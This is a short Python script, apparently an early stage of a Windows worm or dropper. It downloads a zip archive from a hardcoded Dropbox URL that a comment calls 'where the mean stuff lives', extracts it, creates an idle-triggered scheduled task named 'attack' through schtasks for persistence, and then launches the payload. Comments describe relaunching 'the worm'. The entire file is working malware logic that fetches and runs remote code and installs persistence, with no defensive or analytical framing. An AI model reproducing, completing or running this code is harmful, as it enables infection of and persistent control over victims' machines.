#!/usr/bin/env python3

import io
import os
import sys
import subprocess
import requests
import zipfile

#debugging function
def kill():
    sys.exit(0)

def launch_attack(attackPath):
    subprocess.call([sys.executable, attackPath])

def schedule_attack(attackPath):
    #schedule the attack to run when the user idles
    idleSched = "schtasks /create /tn \"attack\" /tr " + attackPath + " /sc onidle /i 1"
    subprocess.run(idleSched, shell=True)

def fetch_sources():
    root = os.path.join('..', os.getcwd())
    #hardcode where the mean stuff lives
    url = "https://uc678aaf33e0ee4c61d4b68281f2.dl.dropboxusercontent.com/cd/0/get/Av0uZ3NfPko55_1m7sssnW8ZvF5aj-HrSCEa38PndOrMwWKqahMVMcaWagxDiwQywBWtJQifoTual9X8rOdSzTndNEB881PmsDXsqoEpo9GYxlZC9X25FqoJ7Kamyj4TcWs/file"
    resp = requests.get(url)
    #for now work under the assumption that the response is valid
    zip = zipfile.ZipFile(io.BytesIO(resp.content))
    zip.extractall()

def main():
    """
    Step 1: download assisting binaries - done
    Step 2: move to dir and unzip - done
    Step 3: schedule attack binary - done
    """
    fetch_sources()
    #at this point we have everything in the current working directory
    #play with this line a bit to get it right
    attackPath = os.getcwd() + "\\dummy.py"
    print(attackPath)
    schedule_attack(attackPath)
    #final step is to launch the worm anew
    launch_attack(attackPath)

if __name__ == '__main__':
    main()
